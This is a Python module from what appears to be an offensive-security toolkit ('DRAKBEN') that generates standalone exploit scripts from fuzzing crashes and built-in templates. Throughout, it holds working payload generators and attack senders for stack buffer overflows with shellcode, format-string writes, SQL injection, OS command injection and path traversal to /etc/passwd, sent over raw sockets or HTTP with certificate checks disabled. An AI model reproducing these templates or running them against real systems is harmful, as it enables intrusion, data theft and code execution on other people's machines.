"""DRAKBEN Research - Exploit Crafter
Author: @drak_ben
Description: Automatically generates PoC scripts from fuzzing crashes.
"""

import logging
import os
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from typing import Any

from .fuzzer import FuzzResult

logger = logging.getLogger(__name__)


class ExploitType(Enum):
    """Common exploit types."""

    BUFFER_OVERFLOW = "buffer_overflow"
    FORMAT_STRING = "format_string"
    SQL_INJECTION = "sql_injection"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XSS = "xss"
    DESERIALIZATION = "deserialization"
    GENERIC = "generic"


@dataclass
class ExploitTemplate:
    """Exploit template configuration."""

    name: str
    exploit_type: ExploitType
    description: str
    payload_generator: str  # Python code for payload generation
    attack_code: str  # Python code for attack execution


# =============================================================================
# EXPLOIT TEMPLATES
# =============================================================================

EXPLOIT_TEMPLATES: dict[ExploitType, ExploitTemplate] = {
    ExploitType.BUFFER_OVERFLOW: ExploitTemplate(
        name="Buffer Overflow",
        exploit_type=ExploitType.BUFFER_OVERFLOW,
        description="Stack-based buffer overflow exploitation",
        payload_generator='''
def generate_payload(offset: int, return_addr: bytes, shellcode: bytes) -> bytes:
    """Generate buffer overflow payload.

    Args:
        offset: Bytes to reach return address
        return_addr: Return address (little-endian)
        shellcode: Shellcode to execute
    """
    nop_sled = b"\\x90" * 16
    padding = b"A" * offset
    return padding + return_addr + nop_sled + shellcode
''',
        attack_code='''
def attack(target: str, payload: bytes) -> bool:
    """Send buffer overflow payload to target."""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target.split(":")[0], int(target.split(":")[1])))
        sock.send(payload)
        sock.close()
        return True
    except Exception as e:
        print(f"[!] Attack failed: {e}")
        return False
''',
    ),
    ExploitType.FORMAT_STRING: ExploitTemplate(
        name="Format String",
        exploit_type=ExploitType.FORMAT_STRING,
        description="Format string vulnerability exploitation",
        payload_generator='''
def generate_payload(target_addr: int, value: int, offset: int = 6) -> bytes:
    """Generate format string write payload.

    Args:
        target_addr: Address to write to
        value: Value to write
        offset: Stack offset to payload
    """
    # Write-what-where using %n
    addr_bytes = target_addr.to_bytes(4, "little")
    fmt = f"%{value}c%{offset}$n".encode()
    return addr_bytes + fmt
''',
        attack_code='''
def attack(target: str, payload: bytes) -> bool:
    """Send format string payload."""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target.split(":")[0], int(target.split(":")[1])))
        sock.send(payload)
        response = sock.recv(4096)
        print(f"[*] Response: {response[:100]}")
        sock.close()
        return True
    except Exception as e:
        print(f"[!] Attack failed: {e}")
        return False
''',
    ),
    ExploitType.SQL_INJECTION: ExploitTemplate(
        name="SQL Injection",
        exploit_type=ExploitType.SQL_INJECTION,
        description="SQL injection exploitation",
        payload_generator='''
def generate_payload(
    injection_type: str = "union",
    columns: int = 5,
    table: str = "users",
) -> str:
    """Generate SQL injection payload.

    Args:
        injection_type: Type of injection (union, error, blind)
        columns: Number of columns for UNION
        table: Target table name
    """
    if injection_type == "union":
        cols = ",".join([f"NULL" for _ in range(columns - 1)] + ["@@version"])
        return f"' UNION SELECT {cols}-- -"
    elif injection_type == "error":
        return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -"
    elif injection_type == "blind":
        return f"' AND (SELECT SUBSTRING(username,1,1) FROM {table} LIMIT 1)='a'-- -"
    else:
        return "' OR '1'='1'-- -"
''',
        attack_code='''
def attack(url: str, payload: str, param: str = "id") -> dict:
    """Send SQL injection payload via HTTP."""
    import requests
    try:
        response = requests.get(
            url,
            params={param: payload},
            timeout=10,
            verify=False,
        )
        return {
            "status": response.status_code,
            "length": len(response.text),
            "body": response.text[:500],
        }
    except Exception as e:
        return {"error": str(e)}
''',
    ),
    ExploitType.COMMAND_INJECTION: ExploitTemplate(
        name="Command Injection",
        exploit_type=ExploitType.COMMAND_INJECTION,
        description="OS command injection exploitation",
        payload_generator='''
def generate_payload(
    command: str = "id",
    separator: str = ";",
    os_type: str = "linux",
) -> str:
    """Generate command injection payload.

    Args:
        command: Command to execute
        separator: Command separator (; | || && \\n)
        os_type: Target OS (linux, windows)
    """
    if os_type == "windows":
        payloads = [
            f"& {command}",
            f"| {command}",
            f"|| {command}",
            f"`{command}`",
        ]
    else:
        payloads = [
            f"; {command}",
            f"| {command}",
            f"|| {command}",
            f"$({command})",
            f"`{command}`",
        ]
    return payloads[0] if separator == ";" else f"{separator} {command}"
''',
        attack_code='''
def attack(url: str, payload: str, param: str = "cmd") -> dict:
    """Send command injection payload."""
    import requests
    try:
        response = requests.post(
            url,
            data={param: payload},
            timeout=10,
            verify=False,
        )
        return {
            "status": response.status_code,
            "body": response.text[:1000],
        }
    except Exception as e:
        return {"error": str(e)}
''',
    ),
    ExploitType.PATH_TRAVERSAL: ExploitTemplate(
        name="Path Traversal",
        exploit_type=ExploitType.PATH_TRAVERSAL,
        description="Directory traversal / LFI exploitation",
        payload_generator='''
def generate_payload(
    target_file: str = "/etc/passwd",
    depth: int = 5,
    encoding: str = "plain",
) -> str:
    """Generate path traversal payload.

    Args:
        target_file: File to read
        depth: Directory traversal depth
        encoding: Encoding (plain, url, double_url)
    """
    traversal = "../" * depth + target_file.lstrip("/")

    if encoding == "url":
        traversal = traversal.replace("../", "%2e%2e%2f")
    elif encoding == "double_url":
        traversal = traversal.replace("../", "%252e%252e%252f")

    return traversal
''',
        attack_code='''
def attack(url: str, payload: str, param: str = "file") -> dict:
    """Send path traversal payload."""
    import requests
    try:
        response = requests.get(
            url,
            params={param: payload},
            timeout=10,
            verify=False,
        )
        indicators = ["root:", "bin:", "[boot loader]", "<?php"]
        success = any(ind in response.text for ind in indicators)
        return {
            "status": response.status_code,
            "success": success,
            "body": response.text[:500] if success else "",
        }
    except Exception as e:
        return {"error": str(e)}
''',
    ),
}


class ExploitCrafter:
    """Turns crashes into weaponized PoCs."""

    def __init__(self, output_dir: str = "custom_tools/exploits") -> None:
        self.output_dir = output_dir
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        logger.info("Exploit Crafter initialized")

    def generate_poc(self, target_name: str, crash: FuzzResult) -> str:
        """Create a standalone python script to reproduce the crash."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"exploit_{target_name}_{timestamp}.py"
        filepath = os.path.join(self.output_dir, filename)

        # Prepare payload representation
        if isinstance(crash.input_data, bytes):
            payload_repr = str(crash.input_data)
        else:
            payload_repr = f"'{crash.input_data}'"

        content = f"""
# DRAKBEN GENERATED EXPLOIT POC
# Target: {target_name}
# Date: {timestamp}
# Crash Error: {crash.error_message}

import sys
import os

def payload() -> Any:
    return {payload_repr}

def attack() -> Any:
    data = payload()
    print(f"[*] Sending payload of size {{len(data)}} bytes...")

    # Target function logic should be inserted here manually or via template
    # For now, we print the payload for manual usage
    print("[+] Payload generated.")
    try:
        sys.stdout.buffer.write(data) if isinstance(data, bytes) else print(data)
    except Exception:
        pass

if __name__ == "__main__":
    attack()
"""
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)

        logger.info("Exploit PoC saved to: %s", filepath)
        return filepath

    def generate_from_template(
        self,
        exploit_type: ExploitType,
        target_name: str,
        custom_params: dict[str, Any] | None = None,
    ) -> str:
        """Generate exploit from predefined template.

        Args:
            exploit_type: Type of exploit to generate
            target_name: Name of target for file naming
            custom_params: Custom parameters for payload generation

        Returns:
            Path to generated exploit file

        """
        if exploit_type not in EXPLOIT_TEMPLATES:
            logger.error(f"Unknown exploit type: {exploit_type}")
            return ""

        template = EXPLOIT_TEMPLATES[exploit_type]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"exploit_{target_name}_{template.exploit_type.value}_{timestamp}.py"
        filepath = os.path.join(self.output_dir, filename)

        params_str = ""
        if custom_params:
            params_str = "\n".join(
                f"    {k} = {v!r}" for k, v in custom_params.items()
            )

        content = f"""#!/usr/bin/env python3
# DRAKBEN GENERATED EXPLOIT - {template.name}
# Target: {target_name}
# Type: {template.exploit_type.value}
# Date: {timestamp}
# Description: {template.description}

import sys
from typing import Any

# =============================================================================
# CONFIGURATION
# =============================================================================
TARGET = "127.0.0.1:8080"  # Modify this
{params_str}

# =============================================================================
# PAYLOAD GENERATOR
# =============================================================================
{template.payload_generator}

# =============================================================================
# ATTACK CODE
# =============================================================================
{template.attack_code}

# =============================================================================
# MAIN
# =============================================================================
def main() -> None:
    print(f"[*] {template.name} Exploit for {{TARGET}}")
    print("[*] Generating payload...")

    # TODO: Customize parameters based on target
    payload = generate_payload()
    print(f"[+] Payload: {{payload[:100] if len(str(payload)) > 100 else payload}}")

    print("[*] Sending attack...")
    result = attack(TARGET, payload)
    print(f"[+] Result: {{result}}")


if __name__ == "__main__":
    main()
"""
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)

        logger.info(f"Template exploit saved to: {filepath}")
        return filepath

    def list_templates(self) -> list[dict[str, str]]:
        """List available exploit templates.

        Returns:
            List of template info dicts

        """
        return [
            {
                "type": template.exploit_type.value,
                "name": template.name,
                "description": template.description,
            }
            for template in EXPLOIT_TEMPLATES.values()
        ]

    def get_template(self, exploit_type: ExploitType) -> ExploitTemplate | None:
        """Get specific exploit template.

        Args:
            exploit_type: Type of exploit

        Returns:
            ExploitTemplate or None

        """
        return EXPLOIT_TEMPLATES.get(exploit_type)
